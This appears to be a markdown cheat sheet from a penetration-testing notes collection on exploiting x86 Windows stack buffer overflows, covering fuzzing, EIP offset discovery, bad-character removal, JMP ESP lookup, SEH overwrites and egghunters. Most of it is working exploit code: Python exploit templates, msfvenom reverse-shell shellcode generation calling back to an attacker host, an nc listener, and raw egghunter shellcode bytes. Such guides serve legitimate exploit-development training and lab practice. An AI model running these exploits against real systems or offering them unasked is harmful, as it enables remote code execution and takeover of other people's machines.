# Buffer Overflow — [Back to Main](../README.md)

Classic x86 Windows stack-based BOF — manual approach.
Assumes Immunity Debugger + mona.py on the target Windows VM.

---

## Setup

```bash
# LHOST: set target
export IP=<target_ip>
export PORT=<vulnerable_port>

# In Immunity Debugger on target — set mona working dir
# !mona config -set workingfolder C:\mona\%p
```

---

## Step 1 — Fuzzing (Find Crash Length)

```python
#!/usr/bin/env python3
# fuzzer.py
import socket, sys, time

PREFIX = b""       # any required prefix for the protocol (e.g. b"OVERFLOW1 ")
SUFFIX = b""       # any required suffix

buf = b"A" * 100
while True:
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((sys.argv[1], int(sys.argv[2])))
        s.recv(1024)
        print(f"[*] Sending {len(buf)} bytes")
        s.send(PREFIX + buf + SUFFIX)
        s.recv(1024)
        s.close()
        buf += b"A" * 100
        time.sleep(0.5)
    except Exception as e:
        print(f"[!] Crashed at ~{len(buf)} bytes")
        sys.exit()
```

```bash
python3 fuzzer.py $IP $PORT
# Note approximate crash length
```

---

## Step 2 — Find Exact EIP Offset

```bash
# Generate unique pattern (use crash length + 400 buffer)
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <crash_length>
```

Send the pattern instead of A's. Observe EIP value in Immunity when it crashes.

```bash
# Find offset from EIP value
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP_value>
# Or in Immunity: !mona findmsp -distance <crash_length>
```

---

## Step 3 — Confirm EIP Control

```python
#!/usr/bin/env python3
# exploit.py — template, update each step
import socket

IP = "<target>"
PORT = <port>
PREFIX = b""
SUFFIX = b""
OFFSET = <exact_offset>
RETN = b"BBBB"       # EIP should = 42424242
PADDING = b""
PAYLOAD = b""

buf = PREFIX + b"A" * OFFSET + RETN + PADDING + PAYLOAD + SUFFIX
s = socket.socket()
s.connect((IP, PORT))
s.recv(1024)
s.send(buf)
```

EIP = `42424242` → offset is correct.

---

## Step 4 — Bad Characters

```bash
# Generate bytearray in Immunity (exclude \x00 always):
# !mona bytearray -b "\x00"
```

```python
# Generate all bytes \x01-\xff (excluding known bad chars as you find them)
BADCHARS = b"\x01\x02\x03..."   # all chars except \x00
PAYLOAD = BADCHARS
```

Send and observe ESP dump in Immunity:

```bash
# Compare ESP memory to bytearray file — highlights bad chars
# !mona compare -f C:\mona\<app>\bytearray.bin -a <ESP_address>
```

Remove each bad char found, regenerate bytearray and payload, repeat until `Unmodified`.

---

## Step 5 — Find JMP ESP

```bash
# In Immunity — find JMP ESP in modules without ASLR/DEP/SafeSEH
# !mona jmp -r esp -cpb "\x00\x0a"    # add ALL bad chars to -cpb

# Note address (e.g. 0x625011AF) → convert to little endian
# 0x625011AF → \xAF\x11\x50\x62
```

---

## Step 6 — Generate Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  EXITFUNC=thread \
  -b "\x00\x0a"          \    # add ALL bad chars here
  -f python -v PAYLOAD
```

---

## Step 7 — Final Exploit

```python
#!/usr/bin/env python3
import socket

IP = "<target>"
PORT = <port>
PREFIX = b""
SUFFIX = b""
OFFSET = <exact_offset>
RETN = b"\xAF\x11\x50\x62"   # JMP ESP address — little endian
PADDING = b"\x90" * 16        # NOP sled (gives shellcode room to land)

PAYLOAD = b""   # paste msfvenom output here

buf = PREFIX + b"A" * OFFSET + RETN + PADDING + PAYLOAD + SUFFIX

s = socket.socket()
s.connect((IP, PORT))
s.recv(1024)
s.send(buf)
```

```bash
# Start listener before running
rlwrap nc -lvnp $LPORT
python3 exploit.py
```

---

## Tips

- If crash is inconsistent: add `time.sleep(1)` between connection attempts.
- If shellcode doesn't execute: increase NOP sled to 32+ bytes.
- `EXITFUNC=thread` prevents the service from crashing after shell exits.
- Always test the final exploit in Immunity first, then against the real target.
- If `!mona jmp` returns nothing: try `!mona find -s "\xff\xe4" -type raw` or look in the application's own DLLs.

---

## SEH Exploitation

Structured Exception Handling (SEH) overwrites differ from vanilla EIP overwrites. Used when the crash overwrites the SEH chain instead of EIP directly.

### SEH chain layout on stack

```
[nSEH]  ← 4 bytes — next SEH record pointer (you control this)
[SEH]   ← 4 bytes — exception handler address (you overwrite with POP POP RETN)
```

When an exception fires, Windows calls the handler at `[SEH]`. `POP POP RETN` unwinds two values from the stack (puts us at `nSEH`), then executes whatever is at `nSEH`. Put a short jump there to reach shellcode above the SEH record.

### Workflow

```bash
# Step 1: crash the app, check if SEH chain is overwritten
# In Immunity: View → SEH chain — does it show your pattern bytes?

# Step 2: find exact SEH offset
!mona findmsp -distance <crash_length>
# Look for "SE handler" line — gives offset to SEH record

# Step 3: find POP POP RETN gadget in a module WITHOUT SafeSEH/ASLR
!mona seh -cpb "\x00\x0a"     # adds bad chars to filter
# Pick an address from a module with: Rebase=False, SafeSEH=False, ASLR=False, NXCompat=False

# Step 4: construct payload
OFFSET_TO_NSEH = <offset_from_mona>
NSEH = b"\xeb\x06\x90\x90"    # short jump +6 bytes to skip over SEH into shellcode
SEH  = b"\xAD\x11\x50\x62"    # POP POP RETN — little endian
```

```python
#!/usr/bin/env python3
import socket

IP = "<target>"
PORT = <port>
PREFIX = b""
SUFFIX = b""
OFFSET = <nseh_offset>
NSEH = b"\xeb\x06\x90\x90"           # short JMP past SEH record
SEH  = b"\xAD\x11\x50\x62"           # POP POP RETN — no SafeSEH module
PADDING = b"\x90" * 16               # NOP sled after SEH for shellcode
PAYLOAD = b""                         # msfvenom output here

buf = PREFIX + b"A" * OFFSET + NSEH + SEH + PADDING + PAYLOAD + SUFFIX

s = socket.socket()
s.connect((IP, PORT))
s.recv(1024)
s.send(buf)
```

```bash
# Generate shellcode (same as vanilla BOF — add all bad chars to -b)
msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
  EXITFUNC=thread -b "\x00\x0a" -f python -v PAYLOAD
```

> **SafeSEH bypass:** must find `POP POP RETN` in a DLL compiled without `/SAFESEH`. `!mona seh` filters these out by default. If no such module exists — use a heap spray or egghunter.

---

## Egghunter

Use when shellcode space at the overflow point is too small (< ~300 bytes). A small 32-byte stub searches the entire virtual address space for your egg tag, then jumps to the full shellcode located elsewhere in memory.

### Egg selection

Pick a 4-byte tag that won't appear in your exploit buffer:
```
egg = b"w00t"    # common — must be unique and not in buf
# Full search tag = egg repeated twice: b"w00tw00t"
```

### Generate egghunter stub

```bash
# In Immunity Debugger (mona)
!mona egg -t w00t

# Manual (NtAccessCheckAndAuditAlarm — 32 bytes, x86 Windows)
```

```python
# Egghunter shellcode (NtAccessCheckAndAuditAlarm — reliable on XP/7/10)
egghunter = (
    b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    b"\xef\xb8\x77\x30\x30\x74"   # 'w00t' as DWORD — change to match your egg
    b"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)
```

### Exploit structure

```python
#!/usr/bin/env python3
import socket

IP = "<target>"
PORT = <port>

EGG    = b"w00tw00t"       # 8 bytes — prepend to shellcode
OFFSET = <eip_offset>
RETN   = b"\xAF\x11\x50\x62"   # JMP ESP — same as vanilla BOF

egghunter = (
    b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
    b"\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
)

PAYLOAD = b""   # full shellcode — prepend EGG before it
# msfvenom -p windows/shell_reverse_tcp ... -f python -v PAYLOAD

# Full shellcode in buffer goes somewhere that fits (e.g. earlier in the request, different parameter)
# Egghunter goes in the small space at EIP control point

buf = b"A" * OFFSET + RETN + b"\x90" * 8 + egghunter
shell_buf = EGG + PAYLOAD   # send this somewhere spacious in the same request/memory

s = socket.socket()
s.connect((IP, PORT))
s.recv(1024)
# Adjust based on protocol — ensure both buffers reach the process
s.send(shell_buf)  # or send in a separate field/parameter
s.send(buf)
```

> **Egg tag note:** the egg must be exactly 4 bytes, repeated twice in shellcode (`w00tw00t`). The DWORD in the egghunter stub (`\x77\x30\x30\x74` = `w00t` in little endian) must match your egg.
